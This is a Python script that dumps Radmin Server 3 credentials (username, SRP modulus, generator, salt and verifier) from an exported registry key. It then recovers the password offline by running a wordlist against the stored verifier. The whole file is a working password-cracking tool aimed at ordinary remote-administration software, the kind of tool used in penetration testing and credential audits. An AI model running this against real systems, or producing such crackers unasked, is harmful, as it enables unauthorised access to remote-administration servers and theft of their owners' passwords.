import hashlib
import sys
import argparse

parser = argparse.ArgumentParser(description='Dump (and bruteforce) Radmin Server 3 creds')
parser.add_argument('regkey', metavar='regkey.txt')
parser.add_argument('--wordlist', help='wordlist for bruteforce', default=None)

args = parser.parse_args()

wordlist = args.wordlist
key = open(args.regkey).read()

def to_utf16(st):
    newar = []
    for l in st:
        newar.append(l)
        newar.append(0)
    return bytes(newar)


def parsekey(key):
    patstart = "=hex:"
    key = key[key.find(patstart)+len(patstart):]
    key = list(map(lambda x:int(x,16),key.replace(" ","").replace("\n","").replace("\\","").split(",")))
    
    content = {}
    i=0
    while i<len(key):
        dtyp = key[i+1]*0x100+key[i]
        dlen = key[i+2]*0x100+key[i+3]
        i+=4
        content[dtyp] = (bytes(key[i:i+dlen]))
        i+=dlen
    
    username = content[16]
    modulus = content[48]
    g = content[64]
    salt = content[80]
    hashh = content[96]

    print("Username :",username.replace(b"\x00",b""))
    print("Modulus :",modulus.hex())
    print("Generator :",g.hex())
    print("Salt :",salt.hex())
    print("Verifier :",hashh.hex())

    return username,modulus,g,salt,hashh

username,modulus,g,salt,hashh = parsekey(key)
modulus = int(modulus.hex(),16)
g = int(g.hex(),16)
hashh = int(hashh.hex(),16)

if wordlist:
    n = 0
    for line in open(wordlist,"rb").readlines():
        n+=1
        if(n%1000)==0:print(n)
        passw = to_utf16(line.strip())
        concat = username+b":"+passw
        shahash = hashlib.sha1(salt+hashlib.sha1(concat).digest()).digest()
        if pow(g,int(shahash.hex(),16),modulus) == hashh:
            print("PASSWORD : ",passw.decode("utf8"))
            exit()